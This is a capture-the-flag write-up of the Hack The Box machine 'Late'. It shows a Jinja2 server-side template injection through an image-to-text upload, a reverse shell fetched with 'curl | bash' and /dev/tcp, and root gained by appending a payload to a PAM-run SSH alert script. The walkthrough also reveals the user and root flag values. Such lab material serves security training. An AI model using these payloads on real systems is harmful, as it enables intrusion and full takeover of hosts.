@@ -1,0 +1,373 @@
+LATE - Hack The Box - Linux, SSTI, Image to Text Convertor, PAM module Execution
+
+IPPSEC Youtube LINK: https://www.youtube.com/watch?v=3s_eVc6KyM8
+
+2 PORTS OPEN 22, 80, NGNIX for port 80 very likely will host python and ruby backend
+COMMANDS and TEXT:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/late]
+└─$ nmap -sCV -oA late 10.10.11.156       
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 15:18 EDT
+Nmap scan report for 10.10.11.156
+Host is up (0.13s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
+|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
+|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.56 seconds
+=============================================================================================
+
+Inspecting the web page we see a hostname that we can add to hosts file by clicking on one of 
+the links and getting redirected, mean that the server may have virtual host routing added. 
+We also find a potential user.
+COMMANDS and TEXT:
+=============================================================================================
+images.late.htb
+support@late.htb
+=============================================================================================
+
+We get text claiming we can upload images unto the server.
+COMMANDS and TEXT:
+=============================================================================================
+Convert image to textwith Flask
+If you want to turn an image into a text document, you came to the right place.
+
+
+Convert your image now!
+Choose file
+=============================================================================================
+
+With this we can now deduce that the sever is using python as its backend as flask is a python
+framework.
+
+We entertain the idea of taking a screenshot and verifying that the program does what it says
+it does. It does, now we have to see if we can exploit that.
+
+Since the program is in python file uploads doesn't usually work.
+Going to try server side template injection. Comman ways to get server to execute code based
+upon displaying output 
+
+Will use cobalt strike to get an ssti template. 
+COMMANDS and TEXT:
+=============================================================================================
+https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
+=============================================================================================
+
+We will screen shot a picture of the fuzz string and upload the image
+COMMANDS and TEXT:
+=============================================================================================
+${{<%[%'"}}%\.$       
+=============================================================================================
+
+And we get an error
+COMMANDS and TEXT:
+=============================================================================================
+Error occured while processing the image: unexpected '<'
+=============================================================================================
+
+Error came after the 2 braces, so what will do next is take a sceenshot of the braces but 
+entering a mathemtical expression to see if we can get code execution.
+COMMANDS and TEXT:
+=============================================================================================
+{{ 2 * 2 }}
+
+..
+..
+..
+
+<p>4
+</p>
+=============================================================================================
+
+We received the output above meaning execution is possible. 
+
+Search payload all the things, jinja 2 
+COMMANDS and TEXT:
+=============================================================================================
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+=============================================================================================
+
+"Exploit the SSTI by calling os.popen().read()"
+
+We take a screenshot of the following and look for the output of 'id'
+COMMANDS and TEXT:
+=============================================================================================
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+
+..
+..
+..
+
+<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+
+</p>
+=============================================================================================
+
+Indeed we get code execution, we can either create a reverse shell or enter ssh credentials
+to login.
+
+If the payload does not work try adjusting the and using a new font on libreoffice to make it 
+more readable and to take a screenshot to see if it works. (comic sans)
+
+Once we have the code execution working we will make usre to make the text size as small as 
+possible to lower the risk of the payload failing, we will simply curl our own ip on the 
+server and execute bash which the index.html file we will create will have a reverse shell.
+COMMANDS and TEXT:
+=============================================================================================
+
+
+┌──(kali㉿kali)-[~/htb/linux/late/www]
+└─$ sudo python3 -m http.server 80  
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.156 - - [20/Aug/2022 16:51:15] "GET / HTTP/1.1" 200 -
+
+..
+..
+..
+
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl 10.10.14.8 | bash').read() }}
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/linux/late/www]
+└─$ cat index.html        
+bash -i >& /dev/tcp/10.10.14.8/9001 0>&1 
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/linux/late/www]
+└─$ nc -lnvp 9001                  
+listening on [any] 9001 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.156] 56038
+bash: cannot set terminal process group (1344): Inappropriate ioctl for device
+bash: no job control in this shell
+svc_acc@late:~/app$ 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+svc_acc@late:~/app$ ^Z
+zsh: suspended  nc -lnvp 9001
+                                                                                              
+┌──(kali㉿kali)-[~/htb/linux/late]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 9001
+
+svc_acc@late:~/app$ 
+svc_acc@late:~/app$ export TERM=xterm
+svc_acc@late:~/app$ stty rows 24 cols 94
+
+=============================================================================================
+
+We now have a correctly configured shell
+COMMANDS and TEXT:
+=============================================================================================
+svc_acc@late:~$ cat user.txt 
+5cd848d6b4be61a13b39feca42297393
+=============================================================================================
+
+Look for any credentials in the app directory. Couldn't find any based on what was found 
+two aps currently running one being static used by virtual host routing and the other web 
+page which uses flask to convert the images into text that can be executed. (The tool being
+used for that is called tesseract by google).
+
+We can check for accounts that have avialbility of getting a shell on the system.
+COMMANDS and TEXT:
+=============================================================================================
+svc_acc@late:~/app$ grep sh$ /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
+svc_acc@late:~/app$ 
+=============================================================================================
+
+Not a whole lot to do. So what gives, let's what else does the user have access to.
+COMMANDS and TEXT:
+=============================================================================================
+svc_acc@late:~/app$ find / -user svc_acc 2>/dev/null | grep -v '/proc\|/home'
+/usr/local/sbin
+/usr/local/sbin/ssh-alert.sh
+/dev/pts/2
+/dev/pts/1
+/dev/pts/0
+=============================================================================================
+
+We have an ssh alert script.
+COMMANDS and TEXT:
+=============================================================================================
+!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+=============================================================================================
+
+We see that we can potentially highjack the PAM_USER string and add code while executing as
+root. However that is not how this will work instead we hae to notice the permissions of the
+file itself.
+
+The script most likley execute when there is a successful ssh login. Lets check the file 
+permissions.
+COMMANDS and TEXT:
+=============================================================================================
+pp$ ls -lhd /usr/local/sbin/ssh-alert.sh
+-rwxr-xr-x 1 svc_acc svc_acc 433 Aug 21 01:44 /usr/local/sbin/ssh-alert.sh
+svc_acc@late:~/app$ lsattr !$
+lsattr /usr/local/sbin/ssh-alert.sh
+-----a--------e--- /usr/local/sbin/ssh-alert.sh
+=============================================================================================
+
+We notice that we have full permissions on the file until we notice the second order
+attributes set on linux with lsattr, we can append only to the file not actually modify
+in any other way.
+
+The exploit here is to to get successful logins from ssh to get the file to execute. We append
+to the file so we can most likely issue echo with ">>" and write to it that way.
+
+First we get a copy of the ssh private key and set the correct permissions on our local
+machine.
+
+
+COMMANDS and TEXT:
+=============================================================================================
+svc_acc@late:~/app$ echo "curl 10.10.14.8 | bash" >>  /usr/local/sbin/ssh-alert.sh 
+svc_acc@late:~/app$ cat /usr/local/sbin/ssh-alert.sh 
+#!/bin/bash
+
+RECIPIENT="root@late.htb"
+SUBJECT="Email from Server Login: SSH Alert"
+
+BODY="
+A SSH login was detected.
+
+        User:        $PAM_USER
+        User IP Host: $PAM_RHOST
+        Service:     $PAM_SERVICE
+        TTY:         $PAM_TTY
+        Date:        `date`
+        Server:      `uname -a`
+"
+
+if [ ${PAM_TYPE} = "open_session" ]; then
+        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
+fi
+
+
+curl 10.10.14.8 | bash
+=============================================================================================
+
+COMMANDS and TEXT:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/linux/late/ssh]
+└─$ chmod 600 svc_key 
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/linux/late/ssh]
+└─$ ssh svc_acc@10.10.11.156 -i svc_key 
+The authenticity of host '10.10.11.156 (10.10.11.156)' can't be established.
+ED25519 key fingerprint is SHA256:LsThZBhhwN3ctG27voIMK8bWCmPJkR4iDV9eb/adDOc.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.156' (ED25519) to the list of known hosts.
+
+
+..
+..
+..
+
+┌──(kali㉿kali)-[~/htb/linux/late/ssh]
+└─$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.156] 56110
+bash: cannot set terminal process group (7298): Inappropriate ioctl for device
+bash: no job control in this shell
+root@late:/# ls
+
+=============================================================================================
+
+
+The ssh connection ends up hanging since the script was able to execute successfully.
+COMMANDS and TEXT:
+=============================================================================================
+root@late:/root# cat root.txt
+cat root.txt
+c44f193868d0b46c22f88c889ae81e73
+=============================================================================================
+
+Once in looking at scripts directory under root, the cron.sh file modifies the permissions
+to allow the execution of the script, adding and removing it in time intervals
+COMMANDS and TEXT:
+=============================================================================================
+root@late:/root/scripts# cat cron.sh    
+cat cron.sh
+#!/bin/bash
+
+# Adding alert file
+chattr -a /usr/local/sbin/ssh-alert.sh
+rm /usr/local/sbin/ssh-alert.sh
+cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh
+chmod +x /usr/local/sbin/ssh-alert.sh
+chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh
+rm -r /home/svc_acc/app/uploads/* 2>/dev/null
+rm -r /home/svc_acc/app/misc/* 2>/dev/null
+chattr +a /usr/local/sbin/ssh-alert.sh
+=============================================================================================
+
+We can also search for this in the configuration seetings directory
+COMMANDS and TEXT:
+=============================================================================================
+root@late:/etc# grep -R ssh-alert.sh .
+grep -R ssh-alert.sh .
+./pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh
+=============================================================================================
+
+We find that pam executes the script everytime there is a successful ssh login.
+Looking at the cron entry the file is being executed every minute.
+COMMANDS and TEXT:
+=============================================================================================
+root@late:/etc# crontab -l
+crontab -l
+# Edit this file to introduce tasks to be run by cron.
+# Each task to run has to be defined through a single line
+
+..
+..
+..
+
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+
+* * * * * /root/scripts/cron.sh
+=============================================================================================
+
+COMMANDS and TEXT:
+=============================================================================================
+=============================================================================================
+
